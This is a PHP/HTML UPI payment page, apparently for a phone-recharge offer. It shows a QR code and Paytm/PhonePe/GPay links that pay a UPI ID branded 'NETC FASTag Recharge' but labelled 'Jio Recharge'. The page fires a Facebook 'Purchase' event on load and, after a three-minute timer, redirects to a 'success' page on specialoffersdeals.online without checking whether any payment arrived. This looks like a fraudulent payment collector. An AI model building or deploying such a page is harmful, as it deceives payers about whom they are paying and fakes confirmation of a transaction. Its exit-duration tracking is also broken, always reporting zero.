<?php
// Get the amount from URL parameter or default to 149
$amount = isset($_GET['amt']) ? (int)$_GET['amt'] : 149;

// Generate a unique transaction ID
$transactionId = 'TX' . time() . substr(md5(uniqid()), 0, 6);

// UPI ID and merchant details
$upiId = "netc.34161FA820328AA2CCD97400@mairtel";
$merchantName = "NETC FASTag Recharge";
$transactionNote = "Jio Recharge";
$merchantCode = "4784";
$currency = "INR";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Pay ₹ <?php echo $amount; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/x-icon" href="../img/fevicon.png">
    <link rel="stylesheet" type="text/css" href="css/adminx.css">
    <link rel="stylesheet" href="css/all.css">
    
    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s) {
            if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '1336657810880525');
            fbq('track', 'PageView');
            fbq('track', 'Purchase', {
                value: <?php echo $amount; ?>,
                currency: 'INR'
            });
        </script>
        <noscript>
            <img height="1" width="1" style="display:none" 
                 src="https://www.facebook.com/tr?id=1336657810880525&ev=PageView&noscript=1"/>
        </noscript>
    <!-- End Facebook Pixel Code -->

    <style>
        .card {
            border-radius: 10px;
            box-shadow: 0 0.15rem 1.75rem 0 #6d6d6d !important;
        }
        .sp-background {
            background-image: linear-gradient(360deg, white, white);
            background-position: center;
            background-size: cover;
            height: 100vh;
        }  
        .opacity-60 {
            opacity: 0.6!important;
        }
        .bg-mix {
            background: linear-gradient(#024378,#2093ef);
        }
        .choese {
            display: flex;
            justify-content: space-around;
            align-items: center;
            flex-wrap: wrap;
        }
        .choese a {
            display: flex;
            justify-content: start;
            align-items: center;
            width: 47%;
            height: 55px;
            border: 1px solid rgb(210, 210, 210);
            margin-bottom: 10px;
            border-radius: 10px;
            padding: 10px;
            text-decoration: none;
            color: rgb(150, 150, 150);
            font-weight: bold;
        }
        p {
            margin-top: 0;
            margin-bottom: 0rem;
        }
    </style>
</head>

<body class="sp-background">
    <div class="py-4">
        <div class="container px-5">    
            <div class="row justify-content-center">
                <div class="col-md-3 card p-4">    
                    <div class="row">
                        <div class="col-md-12 text-center align-items-center pt-4" style="border: 1px solid #d9d9d9;border-radius: 3px;">  
                            <div>
                                <b>Pay ₹ <?php echo $amount; ?></b>
                            </div>
                            <div class="mb-4">
                                <small style="font-size:100%;" class="opacity-60 font-weight-bold">Pay With Any App or Scan Qr Code</small>
                            </div>
                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=<?php 
                                echo urlencode("upi://pay?ver=01&mode=01&pa=$upiId&pn=$merchantName&tr=$transactionId&tn=$transactionNote&am=$amount&qrMedium=04&mc=$merchantCode&cu=$currency");
                            ?>" width="200" style="max-width:50%">
                            <div class="mb-4 mt-4">
                                <span class="text-center font-weight-bold timeout-text">Timeout at <span id="timeout"></span><br><br></span> 
                                <p style="font-size: 15px; text-align: center;">Paytm, PhonePe, GooglePay, Other Bank</p>
                                <br>
                                <div class="choese">
                                    <a href="paytmmp://pay?pa=<?php echo $upiId; ?>&pn=<?php echo urlencode($merchantName); ?>&tr=<?php echo $transactionId; ?>&tn=<?php echo urlencode($transactionNote); ?>&am=<?php echo $amount; ?>&mc=<?php echo $merchantCode; ?>&cu=<?php echo $currency; ?>" style="font-size:10px">
                                        <img src="images/Paytm.svg" width="40"> Paytm
                                    </a>
                                    <a href="phonepe://pay?pa=<?php echo $upiId; ?>&pn=<?php echo urlencode($merchantName); ?>&tr=<?php echo $transactionId; ?>&tn=<?php echo urlencode($transactionNote); ?>&am=<?php echo $amount; ?>&mc=<?php echo $merchantCode; ?>&cu=<?php echo $currency; ?>" style="font-size:10px">
                                        <img src="images/PhonePe.svg" width="40"> PhonePe
                                    </a>
                                    <a href="upi://pay?pa=<?php echo $upiId; ?>&pn=<?php echo urlencode($merchantName); ?>&tr=<?php echo $transactionId; ?>&tn=<?php echo urlencode($transactionNote); ?>&am=<?php echo $amount; ?>&mc=<?php echo $merchantCode; ?>&cu=<?php echo $currency; ?>" style="font-size:10px">
                                        <img src="images/Google.svg" width="40"> GooglePay
                                    </a>
                                    <a href="upi://pay?pa=<?php echo $upiId; ?>&pn=<?php echo urlencode($merchantName); ?>&tr=<?php echo $transactionId; ?>&tn=<?php echo urlencode($transactionNote); ?>&am=<?php echo $amount; ?>&mc=<?php echo $merchantCode; ?>&cu=<?php echo $currency; ?>" style="font-size:10px">
                                        <img src="images/Bank%20UPI.svg" width="40"> Other Bank
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/sweetalert.min.js"></script>
    
    <script>
        // Time tracking on page exit
        window.addEventListener('beforeunload', function() {
            let entryTime = Math.floor(Date.now() / 1000);
            let exitTime = Math.floor(Date.now() / 1000);
            let durationInSeconds = exitTime - entryTime;
            let hours = Math.floor(durationInSeconds / 3600).toString().padStart(2, '0');
            let minutes = Math.floor((durationInSeconds % 3600) / 60).toString().padStart(2, '0');
            let seconds = (durationInSeconds % 60).toString().padStart(2, '0');
            let duration = `${hours}:${minutes}:${seconds}`;
            navigator.sendBeacon('track.php', new URLSearchParams({ 
                duration: duration,
                amount: <?php echo $amount; ?>,
                transaction_id: '<?php echo $transactionId; ?>'
            }));
        });

        // Countdown Timer
        function upiCountdown(elm, minute, second, url) {
            document.getElementById(elm).innerHTML = formatTime(minute, second);
            startTimer();

            function startTimer() {
                second--;
                if (second < 0) {
                    second = 59;
                    minute--;
                }

                if (minute === 0 && second === 0) {
                    document.getElementById(elm).innerHTML = "Wait..";
                    setTimeout(function() {
                        window.location.href = url + '&txn=<?php echo $transactionId; ?>';
                    }, 1000);
                    return;
                }

                document.getElementById(elm).innerHTML = formatTime(minute, second);
                setTimeout(startTimer, 1000);
            }

            function formatTime(minute, second) {
                return (minute < 10 ? "0" + minute : minute) + ":" + (second < 10 ? "0" + second : second);
            }
        }

        // Start countdown (3 minutes)
        upiCountdown("timeout", 3, 0, "https://specialoffersdeals.online/success.php?amt=<?php echo $amount; ?>");
    </script>
</body>
</html>